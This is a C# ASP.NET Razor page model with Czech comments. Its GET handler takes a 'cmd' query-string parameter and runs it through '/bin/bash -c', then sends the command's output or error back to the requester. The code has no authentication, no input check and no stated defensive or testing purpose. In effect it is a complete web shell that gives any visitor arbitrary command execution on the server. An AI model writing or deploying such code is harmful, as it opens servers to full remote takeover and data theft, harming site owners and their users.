using Microsoft.AspNetCore.Mvc.RazorPages;
using System.Diagnostics;

public class ExecuteCommandModel : PageModel
{
    public string Output { get; set; }

    public void OnGet(string cmd)
    {
        if (!string.IsNullOrEmpty(cmd))
        {
            Output = ExecuteCommand(cmd);
        }
        else
        {
            Output = "No command provided!";
        }
    }

    private string ExecuteCommand(string command)
    {
        try
        {
            // Vytvoření nového procesu
            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "/bin/bash",  // Spuštění Bash shellu v Linuxu
                    Arguments = $"-c \"{command}\"",  // Vykonání libovolného příkazu
                    RedirectStandardOutput = true,  // Získání výstupu z příkazu
                    RedirectStandardError = true,   // Získání chybového výstupu
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };

            // Spuštění procesu
            process.Start();
            
            // Čtení výstupu
            string result = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();
            process.WaitForExit();

            // Vrácení výsledku nebo chyby
            if (!string.IsNullOrEmpty(result))
            {
                return result;
            }
            else if (!string.IsNullOrEmpty(error))
            {
                return $"Error: {error}";
            }
            else
            {
                return "No output returned.";
            }
        }
        catch (Exception ex)
        {
            return $"Exception: {ex.Message}";
        }
    }
}
